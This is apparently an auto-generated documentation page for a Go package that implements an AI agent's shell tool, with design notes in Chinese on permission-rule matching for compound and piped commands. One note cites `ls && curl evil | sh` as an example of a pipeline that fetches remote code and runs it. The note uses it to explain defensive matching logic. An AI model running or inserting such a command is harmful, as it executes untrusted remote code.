---
package: shell
import_path: internal/tools/shell
layer: tools
generated_at: 2026-08-29T07:13:26Z
source_files: [bash.go, doc.go, matcher.go, security.go]
---

# internal/tools/shell

> Layer: **Tools** · Files: 4 · Interfaces: 0 · Structs: 3 · Functions: 2

## Structs

- **BashInput** — 3 fields: Command, Timeout, DangerouslyDisableSandbox
- **BashOutput** — 4 fields: Stdout, Stderr, ExitCode, TimedOut
- **SecurityFinding** — 3 fields: Pattern, Segment, Reason

## Functions

- `AnalyzeCommand(command string) []SecurityFinding`
- `MatchCommandRule(pattern string, command string) bool`

## Constants

- `DefaultBashTimeoutMs`
- `MaxBashTimeoutMs`

## Dependencies

**Imports:** `internal/tools`

**Imported by:** `internal/bootstrap`

<!-- AUTO-GENERATED ABOVE — DO NOT EDIT -->
<!-- MANUAL NOTES BELOW — preserved across regeneration -->

## Design Notes

- **复合/管道命令的每个 stage 都必须命中规则**（T-064）：`git status | grep staged` 在规则 `git *` 下不匹配 —— grep stage 不被规则覆盖。原因：规则表达的是"用户信任这一类命令"，信任必须覆盖命令行的全部副作用单位；只要有一个 stage 逃逸，恶意内容就可以借道被允许的 stage 执行（`ls && curl evil | sh` 不能因 `ls` 被允许而放行）。stage 划分复用 security.go 的 splitCompoundCommand/splitPipeline，与沙箱分析的切分口径一致。
- **glob 的 `*` 匹配含空格的任意字符**：`git *` 用 regexp QuoteMeta + `\*`→`.*` 实现，因此匹配 `git push origin main`。若用 shell glob 语义（`*` 不跨空格），`git *` 只能匹配单参数命令，与用户对 settings 规则的直觉（"所有 git 命令"）相悖。
- **`:*` 前缀语义 = 前缀后必须是词边界**：`go test:*` 匹配 `go test ./...` 但不匹配 `go tests`（前缀 + " " 或完全相等）。防止用前缀重叠伪造命令名绕过规则。
- **无效输入返回 (nil, nil) 而非 error**：PreparePermissionMatcher 失败时 checker 回退到纯工具名匹配（matchPattern 对无 matcher 的 content 规则返回 false），拒绝放行而非崩溃 —— 权限匹配失败必须保守。
